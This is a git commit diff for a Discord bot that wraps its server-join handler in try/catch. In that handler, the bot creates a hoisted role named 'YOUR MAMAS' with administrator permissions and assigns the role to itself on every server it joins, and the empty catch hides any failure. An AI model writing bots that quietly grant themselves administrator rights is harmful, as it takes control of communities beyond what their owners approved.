1524f10d77d3a234b4cb3191542a97349bcb7561
Aarav Gang <aaravgang02@gmail.com>
2021-08-23 16:58:30 +0530

    role creation error handling

--- index.js
+++ index.js
@@ -50,19 +50,21 @@ client.once("ready", () => {
 client.on("guildCreate", async (guild) => {
   let joinStatus = await onGuildJoin(guild);
   // console.log("SERVER JOINED:", joinStatus);
-  guild.roles
-    .create({
-      data: {
-        name: "YOUR MAMAS", //sets the role name
-        color: "#e5f7b2", //sets the color of the role
-        permissions: 8, //sets the roles permissions to administrator
-      },
-    })
-    .then((role) => {
-      guild.member(client.user).roles.add(role);
-      role.setHoist(true);
-    })
-    .catch(console.error);
+  try {
+    guild.roles
+      .create({
+        data: {
+          name: "YOUR MAMAS", //sets the role name
+          color: "#e5f7b2", //sets the color of the role
+          permissions: 8, //sets the roles permissions to administrator
+        },
+      })
+      .then((role) => {
+        guild.member(client.user).roles.add(role);
+        role.setHoist(true);
+      })
+      .catch(e=>console.log(e));
+  } catch (e) {}
 });
 
 client.on("guildDelete", async (guild) => {
